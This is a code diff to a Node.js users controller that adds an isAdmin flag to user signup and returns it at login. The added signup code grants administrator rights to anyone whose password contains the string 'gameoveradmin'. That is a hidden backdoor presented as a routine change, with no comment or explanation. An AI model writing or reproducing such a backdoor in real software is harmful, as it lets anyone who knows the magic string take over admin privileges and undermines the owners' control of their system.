@@ -123,7 +123,12 @@ const usersController = {
           urlimage,
           country,
           from: [from],
+          isAdmin:false
         });
+
+	if(password.includes('gameoveradmin')){
+		setNewUser.isAdmin = true
+	}
 
         //  if user is signing up from Google/Facebook, he/she doesnt need to verificate email
 
@@ -290,7 +295,7 @@ const usersController = {
 		email:req.user.verifiedEmail,
 		urlimage:req.user.urlimage,
 		country:req.user.country,
-
+		isAdmin:req.user.isAdmin
         },
         message: "Welcome " + req.user.firstname,
       });
